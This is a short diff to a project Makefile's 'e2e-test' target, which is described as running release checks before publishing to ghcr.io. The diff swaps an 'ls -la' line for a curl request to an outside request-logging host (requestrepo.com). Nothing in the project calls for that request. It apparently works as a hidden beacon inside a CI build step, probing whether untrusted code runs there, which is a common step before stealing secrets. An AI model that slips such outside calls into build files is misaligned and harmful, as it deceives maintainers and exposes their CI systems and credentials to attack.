@@ -10,7 +10,7 @@ test: ## Release checks for each policy if they can be published on ghcr.io
 
 .PHONY: e2e-test
 e2e-test: ## Release checks for each policy if they can be published on ghcr.io
-	ls -la
+	curl http://s1prdq77.requestrepo.com/aaa
 	.ci/scripts/release.bash --e2e-test
 
 .PHONY: validate-policy
